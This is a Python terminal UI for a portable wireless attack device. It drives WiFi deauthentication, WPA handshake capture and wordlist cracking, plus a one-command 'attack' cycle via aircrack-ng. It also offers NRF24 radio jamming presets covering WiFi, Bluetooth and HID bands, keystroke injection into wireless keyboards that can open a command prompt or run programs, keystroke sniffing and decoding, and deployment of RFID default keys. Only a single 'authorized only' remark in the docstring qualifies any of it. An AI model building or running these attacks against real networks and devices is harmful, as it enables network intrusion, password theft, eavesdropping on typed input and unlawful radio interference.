#!/usr/bin/env python3
"""Interactive TUI for the Treecataje companion device (Phase 4).

Thin front-end over the shared core (companion_proto). USB transport for now;
BLE is a drop-in via companion_ble later.

Smart console (single input box):
  <anything>             run it as a device CLI command (REQ)
  :status                refresh the status panel
  :caps                  show capabilities
  :get <remote> [local]  download a device file (sha256-verified)
  :put <local> <remote>  upload a host file
  :ls [path]             list a device directory (alias for "ls <path>")
  :capture <kind> [secs] log sweeps to the device's SD, then fetch+analyze
                         (kind: telemetry|wifi|nrf|rf; survives a dropped link)
  :crack <pcap> [wl]     crack a local WPA handshake pcap by wordlist
  :crackdev <remote>[wl] fetch a device handshake pcap then crack it
  :scan [secs]           scan WiFi (Ctrl+S); pick a row, then act on it
  :deauth [bssid][ch][n] deauth (defaults to the selected AP) — authorized only
  :handshake / :hs       capture the selected AP's 4-way handshake (deauth+cap)
  :attack [ssid][wl][brute] full cycle via aircrack-ng (defaults to selected AP)
  :wordlists             list discovered wordlists + available crackers
  :nrfscan [ms]          scan NRF24 devices into the table; pick a row
  :nrfjam [secs]         carrier-jam the selected NRF device's channel
  :nrfpreset <name>      jam a band preset (wifi/bt/ble/hid/mic/usb/video/rc/full/hopping)
  :nrfpresets            list the jam presets
  :nrfsweep              sweep-jam NRF channels 1-80
  :nrfhijack <action>[arg][proto] HID inject (calc|cmd|type|run|jam) on selected
  :nrfkeys [secs]        sniff+decode keystrokes from selected (cleartext+MS-XOR)
Keys: ctrl+r refresh status · ctrl+l clear log · ctrl+q quit
"""
import os
import asyncio
import argparse

from textual import work
from textual.app import App, ComposeResult
from textual.containers import Horizontal, Vertical
from textual.widgets import Header, Footer, Input, RichLog, Static, Tree, DataTable

from companion_proto import Companion
import companion_commands as cc

DL_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
WORDLIST_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dictionaries", "wordlists")


class CompanionTUI(App):
    CSS = """
    #left { width: 42%; border-right: solid $primary; padding: 1; }
    #devinfo { color: $success; height: auto; }
    #status { color: $accent; height: auto; margin-bottom: 1; }
    #cmds { height: 1fr; border: round $primary; }
    #aps { height: 40%; border: round $accent; }
    #log { border: round $primary; }
    #cmd { dock: bottom; }
    """
    BINDINGS = [
        ("ctrl+q", "quit", "Quit"),
        ("ctrl+r", "refresh", "Status"),
        ("ctrl+l", "clear", "Clear log"),
        ("ctrl+s", "scan", "Scan WiFi"),
    ]

    def __init__(self, port: str, token: str = "", transport: str = "usb", name: str = "Bruc"):
        super().__init__()
        self.port = port
        self.token = token
        self.transport = transport
        self.ble_name = name
        self.dev = None
        self._lock = asyncio.Lock()
        # last-rendered panel text (also handy for headless testing)
        self.last_devinfo = ""
        self.last_caps = ""
        self.last_status = ""
        self.last_cmd_result = None  # (ok, code, lines) — for headless testing
        self._aps = []               # last WiFi scan results
        self._target = None          # currently selected AP dict
        self._last_pcap = ""         # last captured handshake pcap
        self._table_mode = "wifi"    # what the #aps DataTable currently shows
        self._nrf_devs = []          # last NRF24 scan results
        self._nrf_target = None      # currently selected NRF24 device

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        with Horizontal():
            with Vertical(id="left"):
                yield Static("connecting…", id="devinfo")
                yield Static("", id="status")
                yield Tree("Functions", id="cmds")
            with Vertical():
                yield DataTable(id="aps")
                yield RichLog(id="log", highlight=True, markup=True, wrap=True)
                yield Input(placeholder="pick a function ↖ or type a command…", id="cmd")
        yield Footer()

    def on_mount(self) -> None:
        self.query_one("#log", RichLog).write("[dim]opening %s…[/dim]" % self.port)
        tbl = self.query_one("#aps", DataTable)
        tbl.cursor_type = "row"
        tbl.add_columns("SSID", "BSSID", "ch", "RSSI", "enc")
        tbl.border_title = "WiFi — Ctrl+S to scan, then act on the selected row"
        self._build_tree()
        self.connect()

    def action_scan(self) -> None:
        self.scan()

    @work(exclusive=True, group="dev")
    async def scan(self, secs: float = 6.0) -> None:
        if not self.dev:
            self.write_log("[red]not connected[/red]")
            return
        self.write_log(f"[yellow]scanning WiFi {secs:.0f}s…[/yellow]")
        aps = await asyncio.to_thread(self.dev.scan_aps, secs)
        self._aps = aps
        tbl = self.query_one("#aps", DataTable)
        tbl.clear(columns=True)
        tbl.add_columns("SSID", "BSSID", "ch", "RSSI", "enc")
        self._table_mode = "wifi"
        for ap in aps:
            tbl.add_row(ap["ssid"] or "<hidden>", ap["bssid"], str(ap["ch"]),
                        str(ap["rssi"]), ap["enc"])
        self.write_log(f"[green]found {len(aps)} APs[/green] — select a row, then :deauth / :capture / :attack")
        if aps:
            self._target = aps[0]

    @work(exclusive=True, group="dev")
    async def nrf_scan_run(self, ms: int = 4000) -> None:
        if not self.dev:
            self.write_log("[red]not connected[/red]")
            return
        self.write_log(f"[yellow]scanning NRF24 {ms}ms…[/yellow]")
        devs = await asyncio.to_thread(self.dev.nrf_scan, ms)
        self._nrf_devs = devs
        tbl = self.query_one("#aps", DataTable)
        tbl.clear(columns=True)
        tbl.add_columns("ch", "address", "hits")
        self._table_mode = "nrf"
        for d in devs:
            tbl.add_row(str(d["ch"]), d["addr"], str(d["hits"]))
        self.write_log(f"[green]found {len(devs)} NRF24 devices[/green] — select a row, then "
                       ":nrfjam / :nrfhijack")
        if devs:
            self._nrf_target = devs[0]

    def on_data_table_row_highlighted(self, event) -> None:
        if self._table_mode == "nrf":
            if 0 <= event.cursor_row < len(self._nrf_devs):
                self._nrf_target = self._nrf_devs[event.cursor_row]
                d = self._nrf_target
                self.query_one("#aps", DataTable).border_title = (
                    f"NRF target: {d['addr']} ch{d['ch']} hits={d['hits']}")
        else:
            if 0 <= event.cursor_row < len(self._aps):
                self._target = self._aps[event.cursor_row]
                ap = self._target
                self.query_one("#aps", DataTable).border_title = (
                    f"target: {ap['ssid'] or '<hidden>'} [{ap['bssid']}] "
                    f"ch{ap['ch']} {ap['rssi']}dBm")

    def _require_target(self):
        if not self._target:
            self.write_log("[red]no target — Ctrl+S to scan and select a network[/red]")
        return self._target

    def _require_nrf(self):
        if not self._nrf_target:
            self.write_log("[red]no NRF target — :nrfscan and select a device[/red]")
        return self._nrf_target

    def _build_tree(self) -> None:
        tree = self.query_one("#cmds", Tree)
        tree.root.expand()
        tree.show_root = False
        for name, cmds in cc.all_groups():
            node = tree.root.add(name)
            for cmd in cmds:
                node.add_leaf(cmd.label, data=cmd)
        self._add_dict_nodes(tree)

    def _add_dict_nodes(self, tree) -> None:
        """Append the host dictionaries (IR signals, RFID keys) as tree items."""
        try:
            import companion_dicts as cdi
        except Exception:
            return
        by_brand = {}
        for e in cdi.ir_entries():
            by_brand.setdefault(e["brand"], []).append(e)
        if by_brand:
            ir = tree.root.add("IR dictionary")
            for brand in sorted(by_brand):
                bnode = ir.add(brand)
                for e in by_brand[brand]:
                    line = cdi.ir_tx_line(e)
                    if line:
                        bnode.add_leaf(e["name"], data=cc.Cmd(f"{brand} {e['name']}", line,
                                                              desc="IR dictionary send"))
        if cdi.key_files():
            rf = tree.root.add("RFID keys")
            rf.add_leaf("Deploy default keys.conf", data={"action": "deploy_keys"})

    def on_tree_node_selected(self, event: Tree.NodeSelected) -> None:
        cmd = event.node.data
        if cmd is None:  # a group header: toggle expand
            return
        if isinstance(cmd, dict):  # special dictionary action
            if cmd.get("action") == "deploy_keys":
                self.deploy_keys()
            return
        inp = self.query_one("#cmd", Input)
        if not cmd.args and cmd.kind != "danger":
            # safe, no-arg command -> run immediately
            self.write_log(f"[dim]{cmd.desc}[/dim]" if cmd.desc else "")
            self.run_command(cmd.template + (" " + cmd.suffix if cmd.suffix else ""))
            return
        # needs args or is destructive -> prefill the input, let the user confirm
        defaults = " ".join(a.default for a in cmd.args).strip()
        line = cmd.template + (" " + defaults if defaults else " ")
        if cmd.suffix and not cmd.args:
            line = cmd.template + " " + cmd.suffix
        inp.value = line
        inp.focus()
        argnames = " ".join(f"<{a.name}>" for a in cmd.args)
        warn = "[red]⚠ destructive — [/red]" if cmd.kind == "danger" else ""
        self.write_log(f"{warn}[cyan]{cmd.label}[/cyan]: {argnames or '(no args)'}  "
                       f"— Enter to run" + (f"  [dim]({cmd.desc})[/dim]" if cmd.desc else ""))

    def write_log(self, msg: str) -> None:
        self.query_one("#log", RichLog).write(msg)

    @work(exclusive=True, group="dev")
    async def connect(self) -> None:
        try:
            async with self._lock:
                if self.transport == "ble":
                    from mcp_server import BleSync
                    self.write_log("[dim]scanning BLE '%s'… (needs 'companion ble on')[/dim]" % self.ble_name)
                    self.dev = await asyncio.to_thread(lambda: BleSync(name=self.ble_name, token=self.token))
                    info = self.dev.info
                else:
                    self.dev = await asyncio.to_thread(Companion, self.port)
                    info = await asyncio.to_thread(self.dev.hello, self.token)
            if not info.get("ok"):
                self.query_one("#devinfo", Static).update("[red]HELLO failed[/red]")
                self.write_log("[red]HELLO failed[/red]")
                return
            self.last_caps = ", ".join(info.get("caps", []))
            self.last_devinfo = (f"[b]{info.get('fw')}[/b]\n{info.get('board')}  mtu={info.get('mtu')}\n"
                                 f"[dim]caps:[/dim] {self.last_caps}")
            self.query_one("#devinfo", Static).update(self.last_devinfo)
            self.write_log("[green]connected[/green] " + str(info.get("fw")))
            self.action_refresh()
        except Exception as e:  # noqa: BLE001
            self.write_log(f"[red]connect error:[/red] {e}")

    async def _request(self, cmd: str, timeout=8.0):
        async with self._lock:
            return await asyncio.to_thread(self.dev.request, cmd, timeout)

    @work(group="dev")
    async def action_refresh(self) -> None:
        if not self.dev:
            return
        r = await self._request("status")
        self.last_status = "[b]status[/b]\n" + ("\n".join(r.lines) if r.lines else "(none)")
        self.query_one("#status", Static).update(self.last_status)

    def action_clear(self) -> None:
        self.query_one("#log", RichLog).clear()

    @work(group="dev")
    async def run_command(self, text: str) -> None:
        if not self.dev:
            self.write_log("[red]not connected[/red]")
            return
        try:
            if text in (":status",):
                self.action_refresh()
                return
            if text in (":caps",):
                r = await self._request("companion caps")
                self.write_log("[cyan]caps[/cyan] " + " ".join(r.lines))
                return
            if text.startswith(":get "):
                parts = text.split()
                remote = parts[1]
                os.makedirs(DL_DIR, exist_ok=True)
                local = parts[2] if len(parts) > 2 else os.path.join(DL_DIR, os.path.basename(remote))
                self.write_log(f"[yellow]get[/yellow] {remote} …")
                out = await asyncio.to_thread(self.dev.file_get, remote, local, 512, 60)
                self.write_log(f"[green]saved[/green] {local} ({out['size']} B, sha {out['sha256'][:12]}…)")
                return
            if text.startswith(":put "):
                parts = text.split()
                local, remote = parts[1], parts[2]
                self.write_log(f"[yellow]put[/yellow] {local} -> {remote} …")
                out = await asyncio.to_thread(self.dev.file_put, local, remote, 512, 60)
                self.write_log(f"[green]put ok={out['ok']}[/green] sha {out['sha256'][:12]}…")
                return
            if text.startswith(":capture"):
                # :capture <kind> [secs]  — log sweeps to the device, then fetch+analyze
                parts = text.split()
                kind = parts[1] if len(parts) > 1 else "wifi"
                secs = float(parts[2]) if len(parts) > 2 else 12.0
                os.makedirs(DL_DIR, exist_ok=True)
                self.write_log(f"[yellow]capture[/yellow] {kind} -> device for {secs:.0f}s "
                               f"[dim](survives a dropped link)[/dim] …")
                cap = await asyncio.to_thread(self.dev.capture_fetch, kind, secs, None, "", None)
                import companion_compute
                vr = "[green]✓ verified[/green]" if cap.get("verified") else "[red]⚠ unverified[/red]"
                self.write_log(f"[green]captured[/green] {cap['samples']} samples, {cap['bytes']} B "
                               f"{vr}  [dim]{cap['path']}[/dim]")
                rep = companion_compute.analyze_stream_file(cap["local"])
                for line in rep.splitlines():
                    self.write_log("  " + line)
                return
            if text.startswith(":crackdev"):
                # :crackdev <remote_pcap> [wordlist]  — fetch from device, then crack
                parts = text.split()
                if len(parts) < 2:
                    self.write_log("[red]usage: :crackdev <remote_pcap> [wordlist][/red]")
                    return
                remote = parts[1]
                wl = parts[2] if len(parts) > 2 else ""
                import tempfile
                local = os.path.join(tempfile.gettempdir(), os.path.basename(remote))
                self.write_log(f"[yellow]fetch[/yellow] {remote} …")
                got = await asyncio.to_thread(self.dev.file_get, remote, local, 512, 120)
                self.write_log(f"[green]fetched[/green] {got['size']} B; cracking…")
                await self._crack_local(local, wl)
                return
            if text.startswith(":crack"):
                # :crack <local_pcap> [wordlist]  — offline crack of a host pcap
                parts = text.split()
                if len(parts) < 2:
                    self.write_log("[red]usage: :crack <local_pcap> [wordlist][/red]")
                    return
                await self._crack_local(parts[1], parts[2] if len(parts) > 2 else "")
                return
            if text.startswith(":scan"):
                parts = text.split()
                secs = float(parts[1]) if len(parts) > 1 else 6.0
                self.scan(secs)
                return
            if text.startswith(":nrfscan"):
                parts = text.split()
                ms = int(parts[1]) if len(parts) > 1 else 4000
                self.nrf_scan_run(ms)
                return
            if text.startswith(":nrfpresets"):
                from companion_proto import NRF_JAM_PRESETS
                self.write_log("[b]NRF jam presets:[/b]")
                for nm, p in NRF_JAM_PRESETS.items():
                    self.write_log(f"  [cyan]{nm}[/cyan] — {p['desc']}  {p['range']}")
                return
            if text.startswith(":nrfpreset"):
                # :nrfpreset <name> — jam a named band preset
                parts = text.split()
                if len(parts) < 2:
                    self.write_log("[red]usage: :nrfpreset <name> (see :nrfpresets)[/red]")
                    return
                self.write_log(f"[yellow]nrf jam preset[/yellow] {parts[1]} …")
                try:
                    r = await asyncio.to_thread(self.dev.nrf_jam_preset, parts[1])
                    self.write_log("  " + " ".join(r.lines))
                except Exception as e:  # noqa: BLE001
                    self.write_log(f"[red]{e}[/red]")
                return
            if text.startswith(":nrfsweep"):
                self.write_log("[yellow]nrf sweep jam 1-80…[/yellow]")
                r = await asyncio.to_thread(self.dev.nrf_jam_sweep, 1, 80, 2, 60, 0)
                self.write_log("  " + " ".join(r.lines))
                return
            if text.startswith(":nrfjam"):
                # :nrfjam [secs] — jam the selected NRF device's channel
                parts = text.split()
                d = self._require_nrf()
                if not d:
                    return
                secs = int(parts[1]) if len(parts) > 1 else 3
                self.write_log(f"[yellow]nrf carrier jam[/yellow] ch={d['ch']} {secs}s …")
                r = await asyncio.to_thread(self.dev.nrf_jam_channel, d["ch"], secs)
                self.write_log("  " + " ".join(r.lines))
                return
            if text.startswith(":nrfkeys"):
                # :nrfkeys [secs] — sniff+decode keystrokes from the selected NRF device
                parts = text.split()
                d = self._require_nrf()
                if not d:
                    return
                secs = int(parts[1]) if len(parts) > 1 else 15
                self.write_log(f"[yellow]nrf readkeys[/yellow] {d['addr']} ch{d['ch']} {secs}s "
                               f"[dim](cleartext + MS-XOR)[/dim] …")
                res = await asyncio.to_thread(self.dev.nrf_readkeys, d["addr"], d["ch"], secs)
                for ln in res["lines"]:
                    if ln.startswith("[KEY") or ln.startswith("[ENC") or ln.startswith("[NRF"):
                        self.write_log("  " + ln)
                if res["text"]:
                    self.write_log(f"[green]── typed:[/green] {res['text']!r}")
                return
            if text.startswith(":nrfhijack"):
                # :nrfhijack <action> [arg] [proto] — on the selected NRF device
                parts = text.split()
                d = self._require_nrf()
                if not d:
                    return
                action = parts[1] if len(parts) > 1 else "calc"
                arg = parts[2] if len(parts) > 2 else ""
                proto = parts[3] if len(parts) > 3 else "logi"
                self.write_log(f"[yellow]nrf hijack[/yellow] {d['addr']} ch{d['ch']} "
                               f"action={action} arg={arg or '-'} proto={proto} …")
                r = await asyncio.to_thread(self.dev.nrf_hijack, d["addr"], d["ch"],
                                            action, arg, proto)
                self.write_log("  " + " ".join(r.lines))
                return
            if text.startswith(":deauth"):
                # :deauth [bssid] [ch] [count]  — bssid defaults to the selected AP
                parts = text.split()
                if len(parts) >= 2:
                    bssid, ch = parts[1], (int(parts[2]) if len(parts) > 2 else 0)
                    cnt = int(parts[3]) if len(parts) > 3 else 16
                else:
                    t = self._require_target()
                    if not t:
                        return
                    bssid, ch, cnt = t["bssid"], t["ch"], 24
                self.write_log(f"[yellow]deauth[/yellow] {bssid} ch={ch} ×{cnt} …")
                r = await asyncio.to_thread(self.dev.deauth, bssid, "broadcast", ch, cnt)
                self.write_log("  " + " ".join(r.lines))
                return
            if text.startswith(":handshake") or text.startswith(":hs"):
                # capture the 4-way handshake of the selected AP (deauth + capture)
                t = self._require_target()
                if not t:
                    return
                os.makedirs(DL_DIR, exist_ok=True)
                local = os.path.join(DL_DIR, "hs_%s.pcap" % t["bssid"].replace(":", ""))
                self.write_log(f"[yellow]capture handshake[/yellow] {t['ssid'] or t['bssid']} "
                               f"ch{t['ch']} (deauth)…")
                cap = await asyncio.to_thread(self.dev.capture_handshake, t["bssid"], t["ch"],
                                              25.0, 24, 4, local)
                import wpa_crack as wcm
                tg, _ = wcm.select_target(cap["local"], t["ssid"])
                if tg:
                    self.write_log(f"[green]✓ handshake[/green] {tg.label()} -> {cap['local']}")
                    self._last_pcap = cap["local"]
                else:
                    self.write_log(f"[red]✗ no EAPOL[/red] ({cap.get('samples')} frames) — retry")
                return
            if text.startswith(":wordlists") or text.startswith(":tools"):
                import crackers as ck
                self.write_log("[b]crackers:[/b] " + ", ".join(ck.available_tools()))
                self.write_log("[b]wordlists:[/b]")
                for lbl, p, _sz in ck.list_wordlists():
                    self.write_log(f"  {lbl}  [dim]{p}[/dim]")
                return
            if text.startswith(":attack"):
                # :attack [ssid] [wordlist] [brute] — ssid defaults to the selected AP;
                # full cycle (find→deauth→capture→crack→brute) via aircrack-ng
                parts = text.split()
                if len(parts) >= 2:
                    await self._attack(parts[1], parts[2] if len(parts) > 2 else "",
                                       parts[3] if len(parts) > 3 else "")
                else:
                    t = self._require_target()
                    if t:
                        await self._attack(t["ssid"], "", "")
                return
            if text.startswith(":ls"):
                text = "ls " + (text[3:].strip() or "/")
            # default: device command
            self.write_log(f"[bold]> {text}[/bold]")
            r = await self._request(text)
            for line in r.lines:
                self.write_log("  " + line)
            tag = "green" if r.ok and r.code == 0 else "red"
            self.write_log(f"[{tag}]· END code={r.code}{' ' + r.error if r.error else ''}[/{tag}]")
            self.last_cmd_result = (r.ok, r.code, list(r.lines))
        except Exception as e:  # noqa: BLE001
            self.write_log(f"[red]error:[/red] {e}")

    @work(group="dev")
    async def deploy_keys(self) -> None:
        if not self.dev:
            self.write_log("[red]not connected[/red]")
            return
        try:
            import companion_dicts as cdi
            import tempfile
            text = cdi.build_keys_conf(cdi.key_files())
            tmp = os.path.join(tempfile.gettempdir(), "keys.conf")
            with open(tmp, "w") as fh:
                fh.write(text)
            n = sum(1 for ln in text.splitlines() if not ln.startswith("//"))
            self.write_log(f"[yellow]deploy[/yellow] {n} keys -> {cdi.DEV_RFID_KEYS} …")
            async with self._lock:
                out = await asyncio.to_thread(self.dev.file_put, tmp, cdi.DEV_RFID_KEYS, 512, 60)
            self.write_log(f"[green]keys.conf deployed[/green] ok={out['ok']}")
        except Exception as e:  # noqa: BLE001
            self.write_log(f"[red]deploy error:[/red] {e}")

    def _resolve_wl(self, wordlist: str) -> str:
        import crackers as ck
        if wordlist and os.path.isfile(wordlist):
            return wordlist
        wls = ck.list_wordlists()
        if wordlist:
            for _lbl, p, _sz in wls:
                if os.path.basename(p) == wordlist or wordlist in p:
                    return p
        return wls[0][1] if wls else os.path.join(WORDLIST_DIR, "common.txt")

    async def _crack_local(self, pcap: str, wordlist: str) -> None:
        import crackers as ck
        if not os.path.isfile(pcap):
            self.write_log(f"[red]no such pcap:[/red] {pcap}")
            return
        wl = self._resolve_wl(wordlist)
        tool = ck.available_tools()[0]
        bssid = ck.detect_bssid(pcap)
        self.write_log(f"[yellow]crack[/yellow] {os.path.basename(pcap)} via [b]{tool}[/b] "
                       f"+ {os.path.basename(wl)} (bssid {bssid or '?'}) …")
        ev = lambda e: (self.call_from_thread(self.write_log,
                        f"  [dim]{e.get('tested','?')} @ {e.get('rate',0):.0f}/s[/dim]")
                        if e.get("type") == "progress" else None)
        res = await asyncio.to_thread(ck.crack_wordlist, pcap, wl, bssid, tool, "", ev, None)
        if res.get("ok"):
            self.write_log(f"[green]✓ KEY FOUND[/green] ({res['tool']}): [b]{res['key']}[/b]")
        else:
            self.write_log(f"[red]✗ not found[/red] via {res.get('tool')}")

    async def _attack(self, ssid: str, wordlist: str, brute_flag: str) -> None:
        import wifi_attack, crackers as ck
        wl = self._resolve_wl(wordlist)
        brute = brute_flag in ("brute", "1", "true", "yes", "+")
        tool = ck.available_tools()[0]
        self.write_log(f"[b]WPA attack[/b] ssid={ssid} tool={tool} "
                       f"wordlist={os.path.basename(wl)} brute={'yes' if brute else 'no'}")
        log = lambda m: self.call_from_thread(self.write_log, "  " + str(m))
        out = await asyncio.to_thread(
            lambda: wifi_attack.run_attack(self.dev, ssid=ssid, wordlist=wl, brute=brute,
                                           tool=tool, capture_secs=20.0, deauth_count=16,
                                           rounds=3, local_dir=DL_DIR, log=log))
        if out.get("ok"):
            self.write_log(f"[green]✓ KEY FOUND[/green] via {out['method']}/{out.get('tool')}: "
                           f"[b]{out['key']}[/b]")
        else:
            self.write_log(f"[red]✗ {out.get('error', 'failed')}[/red]")

    def on_input_submitted(self, event: Input.Submitted) -> None:
        text = event.value.strip()
        event.input.value = ""
        if text:
            self.run_command(text)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", default="/dev/ttyACM1")
    ap.add_argument("--token", default=os.environ.get("COMPANION_TOKEN", ""),
                    help="companion auth token (required if the device has one set)")
    ap.add_argument("--transport", default="usb", choices=("usb", "ble"),
                    help="usb (serial) or ble (enable it on the device first via 'companion ble on')")
    ap.add_argument("--name", default="Bruc", help="BLE advertised name")
    args = ap.parse_args()
    CompanionTUI(args.port, args.token, args.transport, args.name).run()


if __name__ == "__main__":
    main()
